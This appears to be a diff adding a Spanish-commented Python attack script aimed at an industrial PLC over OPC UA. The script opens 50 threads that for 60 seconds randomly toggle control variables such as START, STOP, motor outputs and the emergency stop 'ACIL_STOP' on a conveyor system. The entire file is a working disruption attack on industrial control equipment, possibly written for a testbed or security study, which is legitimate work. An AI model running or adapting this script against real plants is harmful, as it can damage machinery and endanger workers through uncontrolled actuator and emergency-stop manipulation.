@@ -1,0 +1,52 @@
+from opcua import Client
+import threading
+import time
+import random
+
+# === Configuración ===
+PLC_ENDPOINT = "opc.tcp://10.10.10.53:4840"
+VARIABLES = [
+    "ACIL_STOP", "DONER_MOTOR_1", "DONER_MOTOR_2", "DONER_MOTOR_3",
+    "GRI_BANT", "GRI_SENSOR", "MAVI_BANT", "MAVI_SENSOR",
+    "MOTOR_1", "MOTOR_3", "MOTOR_4", "MOTOR_5", "MOTOR_6",
+    "SISTEM", "START", "STOP",
+    "YAN_DONER_1", "YAN_DONER_2", "YAN_DONER_3",
+    "YESIL_BANT", "YESIL_SENSOR"
+]
+
+DURATION = 60            # Duración total del ataque en segundos
+THREAD_COUNT = 50        # Número de hilos de ataque simultáneo
+
+start_time = time.time()
+
+# === Función de ataque por hilo ===
+def cycle_writer():
+    try:
+        client = Client(PLC_ENDPOINT)
+        client.connect()
+
+        while time.time() - start_time < DURATION:
+            for var in VARIABLES:
+                try:
+                    node = client.get_node(f"ns=4;s=|var|{var}")
+                    node.set_value(random.choice([True, False]))
+                except:
+                    pass  # ignorar fallos por carga
+
+    except:
+        pass
+
+# === Lanzar hilos ===
+print(f"[+] Iniciando ataque con {THREAD_COUNT} hilos durante {DURATION} segundos...")
+threads = []
+
+for _ in range(THREAD_COUNT):
+    t = threading.Thread(target=cycle_writer)
+    t.start()
+    threads.append(t)
+
+# Esperar a que termine el ataque
+for t in threads:
+    t.join()
+
+print(f"[✔] Ataque finalizado. Ejecutado por {DURATION} segundos con {THREAD_COUNT} hilos.")
